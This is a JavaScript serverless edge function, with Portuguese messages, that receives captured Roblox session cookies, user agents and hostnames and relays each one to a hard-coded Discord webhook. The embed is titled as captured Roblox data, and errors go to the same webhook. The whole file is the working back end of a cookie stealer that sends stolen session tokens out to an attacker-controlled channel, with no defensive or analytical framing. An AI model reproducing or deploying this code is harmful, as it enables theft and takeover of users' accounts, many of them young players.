export const config = {
  runtime: "edge",
};

const WEBHOOK_URL = "https://discord.com/api/webhooks/1280941270138617957/e7v-FHCaX2LGwZZuKXhHTyBSCEa4vcPPPIeTsQISfv8WEJ5s0utTnnnQ5flRLYAu2ks3";

export default async function handler(req) {
  try {
    if (req.method !== "POST") {
      return new Response("Método não permitido", { status: 405 });
    }

    const { data } = await req.json();

    if (!data || !Array.isArray(data)) {
      return new Response("Dados inválidos", { status: 400 });
    }

    for (const item of data) {
      const embed = {
        title: "Dados capturados do Roblox",
        color: 0xff0000,
        fields: [
          { name: "Cookie", value: `\`\`\`${item.cookie || "N/A"}\`\`\``, inline: false },
          { name: "User-Agent", value: `\`\`\`${item.userAgent || "N/A"}\`\`\``, inline: false },
          { name: "Host", value: item.host || "Desconhecido", inline: true },
          { name: "Timestamp", value: new Date().toISOString(), inline: true },
        ]
      };

      await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ embeds: [embed] })
      });
    }

    return new Response("Enviado com sucesso", { status: 200 });
  } catch (e) {
    const errorEmbed = {
      title: "Erro ao processar dados",
      color: 0xff0000,
      description: `\`\`\`${e.message || "Erro desconhecido"}\`\`\``,
      timestamp: new Date().toISOString()
    };

    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ embeds: [errorEmbed] })
    });

    return new Response("Erro interno", { status: 500 });
  }
}
